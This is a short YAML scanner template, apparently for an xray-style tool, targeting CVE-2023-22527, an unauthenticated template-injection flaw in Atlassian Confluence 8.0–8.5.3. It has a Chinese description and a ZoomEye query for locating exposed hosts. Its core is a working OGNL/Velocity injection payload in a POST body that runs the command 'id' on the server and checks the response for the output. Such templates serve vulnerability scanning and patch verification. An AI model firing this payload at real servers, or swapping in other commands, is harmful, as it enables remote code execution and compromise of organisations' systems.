id: CVE-2023-22527

info:
  name: Atlassian Confluence远程代码执行漏洞
  author: avic123
  severity: critical
  verified: true
  description: |-
    Atlassian Confluence是澳大利亚Atlassian公司的一套专业的企业知识管理与协同软件，也可以用于构建企业WiKi。
    Atlassian Confluence Data Center and Server存在安全漏洞，该漏洞源于存在模板注入漏洞，
    允许未经身份验证的攻击者在受影响的实例上实现远程代码执行
    影响范围：Atlassian Confluence 8.0 - 8.5.3
    zoomeye: app:"Atlassian-Confluence"
  reference:
    - https://avd.aliyun.com/detail/AVD-2023-22527
    - https://confluence.atlassian.com/pages/viewpage.action?pageId=1333335615
  tags: cve,cve2023,Confluence,rce
  created: 2024/01/24

rules:
  r0:
    request:
      method: POST
      path: /template/aui/text-inline.vm
      body: |
        label=aaa\u0027%2b#request.get(\u0027.KEY_velocity.struts2.context\u0027).internalGet(\u0027ognl\u0027).findValue(#parameters.poc[0],{})%2b\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader('Cmd',(new+freemarker.template.utility.Execute()).exec({'id'}))
    expression: >-
      response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.raw)
expression: r0()
